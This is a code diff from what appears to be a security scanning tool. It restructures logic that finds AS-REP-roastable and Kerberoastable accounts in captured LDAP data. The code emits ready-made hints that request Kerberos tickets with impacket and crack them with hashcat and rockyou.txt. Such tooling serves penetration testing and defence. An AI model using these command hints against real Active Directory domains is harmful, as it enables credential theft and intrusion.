@@ -3144,52 +3144,9 @@ def _multiline_passes(path, report, store):
                 text[:16384])
             _ldap_ip = (_ldap_host_m.group(1) if _ldap_host_m
                          else _dc_fqdn)
-            # iter-244: extract AS-REP-eligible and kerberoastable
-            # users from captured ldapsearch LDIF text. Runs before
-            # emitting the rootDSE finding since the LDIF fields
-            # only appear when the operator queried users past bind.
-            _asrep_seen = set()
-            _dc_ip_for_hint = _ldap_ip
-            _dom_for_hint = (
-                _dc_fqdn.split('.', 1)[-1]
-                if '.' in _dc_fqdn else '<domain>')
-            for _um in _LDAP_USER_BLOCK.finditer(text[:65536]):
-                _sam = _um.group(2).strip()
-                try:
-                    _uac = int(_um.group(3))
-                except (ValueError, TypeError):
-                    continue
-                if _uac & 0x400000 and _sam not in _asrep_seen:
-                    _asrep_seen.add(_sam)
-                    _sam_sh = _sam.replace("'", "'\\''")
-                    report.add("HIGH", "RECON", path, _ln(_um),
-                               f"AS-REP-eligible user (UAC "
-                               f"DONT_REQ_PREAUTH): {_sam}",
-                               hint=(f"impacket-GetNPUsers "
-                                     f"{_dom_for_hint}/ -dc-ip "
-                                     f"{_dc_ip_for_hint} -usersfile "
-                                     f"<(echo '{_sam_sh}') -request "
-                                     f"-no-pass 2>/dev/null | tee "
-                                     f"{_sam}.asrep  |  hashcat -m "
-                                     f"18200 {_sam}.asrep rockyou.txt "
-                                     f"-r rules/best64.rule"))
-            _spn_seen = set()
-            for _sm in _LDAP_SPN_BLOCK.finditer(text[:65536]):
-                _sam_s = _sm.group(1).strip()
-                _spn = _sm.group(2).strip()[:80]
-                if _sam_s in _spn_seen:
-                    continue
-                _spn_seen.add(_sam_s)
-                _sam_s_sh = _sam_s.replace("'", "'\\''")
-                report.add("HIGH", "RECON", path, _ln(_sm),
-                           f"Kerberoastable service account: {_sam_s} "
-                           f"(SPN: {_spn})",
-                           hint=(f"needs any-domain-user cred: "
-                                 f"impacket-GetUserSPNs {_dom_for_hint}/"
-                                 f"<user>:<pw> -dc-ip {_dc_ip_for_hint}"
-                                 f" -request -outputfile {_sam_s}.tgs"
-                                 f"  |  hashcat -m 13100 {_sam_s}.tgs "
-                                 f"rockyou.txt -r rules/best64.rule"))
+            # iter-244 + iter-246: AS-REP + Kerberoastable extraction
+            # runs as a standalone block below now (no longer nested
+            # inside the rootDSE-gated LDAP anon-bind branch).
 
             report.add("HIGH", "SECRET-SIDECHANNEL", path,
                        _ln(_anchor_l),
@@ -3206,6 +3163,84 @@ def _multiline_passes(path, report, store):
                              f"impacket-GetNPUsers "
                              f"{_dc_fqdn.split('.', 1)[-1] if '.' in _dc_fqdn else '<domain>'}/ "
                              f"-dc-ip {_ldap_ip} -request -no-pass"))
+
+    # iter-246: hoisted iter-244 AS-REP + Kerberoastable extraction to
+    # a standalone block. Prior impl was nested inside the iter-227
+    # rootDSE-signal check so bare LDIF captures (no namingContexts /
+    # dnsHostName in the same file) missed the extraction entirely.
+    #
+    # New gating: fires when the file contains BOTH the LDIF-shape
+    # anchors (`dn:` + `sAMAccountName:`) AND at least one user block
+    # matches. Extra content-signal gate rejects prose/tutorial FPs.
+    if not filters.is_doc_file(path):
+        _ldap_ctx = ("dn:" in text[:16384]
+                     and "sAMAccountName" in text[:16384])
+        if _ldap_ctx:
+            # Best-effort domain / DC-IP extraction from context.
+            _dc_fqdn_hoist = "<dc-host>"
+            _dc_ip_hoist = "<dc-ip>"
+            _dom_hoist = "<domain>"
+            _hdns_m = re.search(
+                r'(?im)^\|?\s*(?:dnsHostName|dNSHostName)\s*:\s*'
+                r'([\w\-.]{1,120})', text[:16384])
+            if _hdns_m:
+                _dc_fqdn_hoist = _hdns_m.group(1)
+                if '.' in _dc_fqdn_hoist:
+                    _dom_hoist = _dc_fqdn_hoist.split('.', 1)[-1]
+            _hnmap_m = re.search(
+                r'(?im)^Nmap\s+scan\s+report\s+for\s+([\w.\-:]+)',
+                text[:16384])
+            if _hnmap_m:
+                _dc_ip_hoist = _hnmap_m.group(1)
+            # Extract dn base from any `dn:` line to infer the domain
+            # as a fallback (e.g., `DC=corp,DC=local` → corp.local).
+            if _dom_hoist == "<domain>":
+                _dc_parts_m = re.search(
+                    r'(?im)dn:[^\r\n]*?((?:DC=[^,\s\r\n]+,?)+)',
+                    text[:16384])
+                if _dc_parts_m:
+                    _dc_parts = re.findall(
+                        r'DC=([\w\-]+)', _dc_parts_m.group(1))
+                    if _dc_parts:
+                        _dom_hoist = ".".join(_dc_parts)
+
+            _asrep_seen_h = set()
+            for _um in _LDAP_USER_BLOCK.finditer(text[:65536]):
+                _sam = _um.group(2).strip()
+                try:
+                    _uac = int(_um.group(3))
+                except (ValueError, TypeError):
+                    continue
+                if _uac & 0x400000 and _sam not in _asrep_seen_h:
+                    _asrep_seen_h.add(_sam)
+                    _sam_sh = _sam.replace("'", "'\\''")
+                    report.add("HIGH", "RECON", path, _ln(_um),
+                               f"AS-REP-eligible user (UAC "
+                               f"DONT_REQ_PREAUTH): {_sam}",
+                               hint=(f"impacket-GetNPUsers "
+                                     f"{_dom_hoist}/ -dc-ip "
+                                     f"{_dc_ip_hoist} -usersfile "
+                                     f"<(echo '{_sam_sh}') -request "
+                                     f"-no-pass 2>/dev/null | tee "
+                                     f"{_sam}.asrep  |  hashcat -m "
+                                     f"18200 {_sam}.asrep rockyou.txt "
+                                     f"-r rules/best64.rule"))
+            _spn_seen_h = set()
+            for _sm in _LDAP_SPN_BLOCK.finditer(text[:65536]):
+                _sam_s = _sm.group(1).strip()
+                _spn = _sm.group(2).strip()[:80]
+                if _sam_s in _spn_seen_h:
+                    continue
+                _spn_seen_h.add(_sam_s)
+                report.add("HIGH", "RECON", path, _ln(_sm),
+                           f"Kerberoastable service account: {_sam_s} "
+                           f"(SPN: {_spn})",
+                           hint=(f"needs any-domain-user cred: "
+                                 f"impacket-GetUserSPNs {_dom_hoist}/"
+                                 f"<user>:<pw> -dc-ip {_dc_ip_hoist}"
+                                 f" -request -outputfile {_sam_s}.tgs"
+                                 f"  |  hashcat -m 13100 {_sam_s}.tgs "
+                                 f"rockyou.txt -r rules/best64.rule"))
 
     # iter-245: PowerShell CLM / AMSI / offensive-framework IOCs from
     # captured .ps1 files, PS transcripts, and command-history dumps.
